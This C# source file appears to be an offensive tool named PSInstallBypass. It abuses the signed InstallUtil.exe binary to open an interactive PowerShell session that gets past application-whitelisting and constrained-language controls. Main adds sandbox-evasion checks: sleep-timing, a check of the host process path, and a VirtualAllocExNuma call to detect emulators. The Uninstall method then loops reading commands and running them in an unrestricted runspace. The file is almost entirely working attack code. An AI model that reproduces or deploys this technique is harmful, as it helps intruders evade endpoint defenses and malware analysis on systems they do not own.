using System;
using System.IO;
using System.Text;
using System.Diagnostics;
using System.Management.Automation;
using System.Collections.ObjectModel;
using System.Runtime.InteropServices;
using System.Management.Automation.Runspaces;

namespace PSInstallBypass
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);
        
        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,
          uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
        static void Main(string[] args)
        {
            DateTime stime = DateTime.Now;
            Sleep(10000);
            double etime = DateTime.Now.Subtract(stime).TotalSeconds;
            if (etime < 10)
            {
                return;
            }

            String fileName = Process.GetCurrentProcess().MainModule.FileName;
            if (fileName != "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe")
            {
                return;
            }

            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        private static StringBuilder Output(Collection<PSObject> results)
        {
            StringBuilder Builder = new StringBuilder();
            foreach (PSObject obj in results)
            {
                Builder.Append(obj);
            }

            return Builder;
        }
        private static void CommandExec(PowerShell ps, string cmd)
        {
            string CatchError = "Get-Variable -Value -Name Error | Format-Table -Wrap -AutoSize";
            ps.AddScript(cmd);
            ps.AddCommand("Out-String");

            try
            {
                Collection<PSObject> Results = ps.Invoke();
                Console.WriteLine(Output(Results).ToString().Trim());

                ps.Commands.Clear();
                ps.AddScript(CatchError);
                ps.AddCommand("Out-String");
                Results = ps.Invoke();
                StringBuilder Builder = Output(Results);

                if (!String.Equals(Builder.ToString().Trim(), ""))
                {
                    Console.WriteLine(Builder.ToString().Trim());

                    ps.Commands.Clear();
                    ps.AddScript("$error.Clear()");
                    ps.Invoke();
                }

            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
            ps.Commands.Clear();
        }
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            string cmd;
            const int BufferSize = 4000;
            string cwd = Directory.GetCurrentDirectory();
            Console.SetIn(new StreamReader(Console.OpenStandardInput(), Encoding.UTF8, false, BufferSize));

            Runspace rs = RunspaceFactory.CreateRunspace();
            PowerShell ps = PowerShell.Create();
            Console.WriteLine("[+] Enjoy your new PowerSehll session!\n");
            rs.Open();
            ps.Runspace = rs;

            while (true)
            {
                Console.Write($"PS {cwd}> ");
                cmd = Console.ReadLine();

                if (String.Equals(cmd, "cls"))
                {
                    Console.Clear();
                }

                if (String.Equals(cmd, "exit"))
                {
                    break;
                }

                CommandExec(ps, cmd);
            }
            rs.Close();
        }
    }
}